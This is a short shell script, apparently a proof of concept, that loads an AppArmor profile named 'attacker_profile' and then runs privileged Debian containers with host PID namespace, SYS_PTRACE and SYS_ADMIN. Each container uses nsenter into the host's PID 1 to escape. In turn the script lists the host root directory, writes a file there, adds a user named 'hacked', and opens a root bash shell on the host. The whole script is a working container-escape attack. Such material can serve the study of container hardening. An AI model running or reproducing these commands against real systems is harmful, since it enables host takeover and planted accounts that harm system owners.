#!/bin/sh

#Write profile to apparmor
sudo cp attacker_profile /etc/apparmor.d
sudo apparmor_parser -r -W /etc/apparmor.d/attacker_profile

#List contents of host's root directory
echo "====== ls / ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter -t 1 -m ls /

#Touch a new file in host's root directory
echo "====== touch HelloFromTheOtherSide ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter -t 1 -m touch HelloFromTheOtherSide

#Add a new user on host
echo "====== useradd hacked ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter -t 1 -m /usr/sbin/useradd hacked

#Create a shell in host
echo "====== /bin/bash ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter -t 1 -m /bin/bash


